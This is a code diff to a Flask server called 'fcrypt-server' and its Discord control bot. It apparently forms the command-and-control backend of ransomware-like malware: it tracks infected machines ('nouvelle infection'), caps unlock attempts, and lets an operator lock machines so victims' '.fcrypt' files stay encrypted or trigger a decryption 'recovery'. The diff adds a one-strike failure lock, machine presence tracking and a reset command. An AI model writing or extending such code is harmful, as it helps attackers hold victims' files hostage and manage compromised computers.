@@ -109,6 +109,29 @@ def _is_locked(machine_id: str, env_h: str) -> bool:
             return True
         return False
 
+def _env_attempts(env_h: str) -> int:
+    """Tentatives sur CETTE enveloppe uniquement (cap anti-brute-force par
+    enveloppe, indépendant du compteur machine cumulatif)."""
+    with _state_lock:
+        return STATE.get("e:" + env_h, {}).get("attempts", 0)
+
+def _machine_failed(machine_id: str) -> bool:
+    """True si la machine a DÉJÀ une tentative échouée (success=False avec au
+    moins une tentative) — « sans seconde chance ». Une tentative réussie
+    précédente ne bloque PAS une nouvelle enveloppe (nouvelle infection)."""
+    with _state_lock:
+        m = STATE.get("m:" + machine_id, {})
+        return bool(m.get("attempts", 0) > 0 and m.get("success") is False)
+
+def _touch_machine(machine_id: str):
+    """Enregistre la présence d'une machine (first_seen) sans incrémenter les
+    tentatives — pour que !list la montre même si /unlock retourne locked_out
+    au gate (avant _record_both)."""
+    with _state_lock:
+        if STATE.get("m:" + machine_id) is None:
+            STATE["m:" + machine_id] = {"attempts": 0, "first_seen": time.time(), "envs": {}}
+            _save_state(STATE)
+
 def _lock_machine(machine_id: str) -> int:
     with _state_lock:
         m = STATE.get("m:" + machine_id)
@@ -253,7 +276,7 @@ def health():
 def root():
     """Ping racine : navigateur, cron-job.org et health-check Render
     (HEAD / inclus, géré automatiquement). JSON minuscule, aucun secret."""
-    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.3"}), 200
+    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.0.4"}), 200
 
 @app.errorhandler(404)
 def _not_found(_e):
@@ -298,9 +321,12 @@ def unlock():
 
     env_h = _env_hash(envelope)
 
-    if _is_locked(machine_id, env_h) or _env_unlocked(env_h) or _attempts_of(machine_id, env_h) >= MAX_ATTEMPTS:
-        app.logger.info("unlock locked_out ip=%s machine=%s env=%s",
-                        ip, machine_id[:8], env_h[:8])
+    if _is_locked(machine_id, env_h) or _env_unlocked(env_h) \
+            or _env_attempts(env_h) >= MAX_ATTEMPTS or _machine_failed(machine_id):
+        _touch_machine(machine_id)
+        app.logger.info("unlock locked_out ip=%s machine=%s env=%s locked=%s envatt=%s mfail=%s",
+                        ip, machine_id[:8], env_h[:8], _is_locked(machine_id, env_h),
+                        _env_attempts(env_h), _machine_failed(machine_id))
         return jsonify({"status": "locked_out"}), 403
 
     try:
@@ -404,7 +430,7 @@ def poll():
     if _is_locked(machine_id, env_h):
         app.logger.info("poll locked, recovery blocked ip=%s machine=%s",
                         ip, machine_id[:8])
-        return jsonify({"status": "ok"}), 200
+        return jsonify({"status": "ok", "locked": True}), 200
 
     rec = _take_recovery(machine_id)
     if rec is None:
@@ -469,7 +495,7 @@ def _discord_bot_main(token: str):
             fields=[
                 ("!list", "Machines connues : ✅ en ligne / ❌ hors ligne, 🔒 si verrouillée.", False),
                 ("!lock <id>", "Verrouille la machine : `/unlock` renvoie `locked_out` même avec une bonne réponse au QCM ; `!recovery` désactivé ; les `.fcrypt` restent chiffrés.", False),
-                ("!unlock <id>", "Retire un verrou posé par `!lock` (si le compteur de tentatives n'est pas épuisé).", False),
+                ("!unlock <id>", "Réinitialise la machine : lève le verrou `!lock` ET remet à zéro le compteur de tentatives (machine + enveloppes) — pour re-tester ou accorder une 2ᵉ chance.", False),
                 ("!recovery <id>", "Récupération d'urgence : le PC affiche la progression du déchiffrement en % (refusé si verrouillée).", False),
                 ("!help", "Cette aide.", False),
             ],
@@ -482,7 +508,13 @@ def _discord_bot_main(token: str):
             return
         now = time.time()
         with _state_lock:
-            mids = sorted({k[2:] for k in STATE if k[:2] in ("h:", "m:")})
+            STATE.update(_load_state())
+            _mids = {k[2:] for k in STATE if k[:2] in ("h:", "m:")}
+            for ek, ev in STATE.items():
+                if ek[:2] == "e:" and isinstance(ev, dict):
+                    for sub_mid in ev.get("machines", {}):
+                        _mids.add(sub_mid)
+            mids = sorted(_mids)
             snap = {k: dict(v) for k, v in STATE.items()
                     if k[:2] in ("h:", "m:", "r:") and isinstance(v, dict)}
         if not mids:
@@ -552,27 +584,36 @@ def _discord_bot_main(token: str):
                 "`!unlock <machine_id>` — retire le verrou posé par `!lock`."))
             return
         with _state_lock:
+            STATE.update(_load_state())
             m = STATE.get("m:" + mid)
-            was = bool(m and m.get("locked"))
-            if was:
+            was_locked = bool(m and m.get("locked"))
+            reset_envs = 0
+            if m is not None:
                 m["locked"] = False
                 m.pop("locked_ts", None)
+                m["attempts"] = 0
+                m["success"] = False
                 for env_h in list(m.get("envs", {}).keys()):
                     e = STATE.get("e:" + env_h)
-                    if e:
+                    if e is not None:
                         e["locked"] = False
                         e.pop("locked_ts", None)
+                        e["attempts"] = 0
+                        e["success"] = False
+                        e["unlocked"] = False
+                        reset_envs += 1
                 _save_state(STATE)
-        if was:
+        if m is not None:
             await ctx.send(embed=_embed(
-                f"Verrou levé — `{mid}`", COL_OK,
-                "La machine peut à nouveau tenter un `/unlock` (si le compteur "
-                "de tentatives n'est pas épuisé).",
-                footer=f"déverrouillé par {ctx.author}"))
+                f"Machine réinitialisée — `{mid}`", COL_OK,
+                f"Verrou opérateur levé (était {'ACTIF' if was_locked else 'inactif'}), "
+                f"compteur de tentatives remis à zéro ({reset_envs} enveloppe(s) associée(s)). "
+                f"La machine peut à nouveau tenter un `/unlock`.",
+                footer=f"réinitialisé par {ctx.author}"))
         else:
             await ctx.send(embed=_embed(
-                "Aucun verrou actif", COL_INFO,
-                f"`{mid}` n'était pas verrouillée."))
+                "Machine inconnue", COL_WARN,
+                f"`{mid}` n'est pas dans l'état serveur. Vérifie l'id avec `!list`."))
 
     @bot.command(name="recovery")
     async def _recovery_cmd(ctx, mid: str = ""):
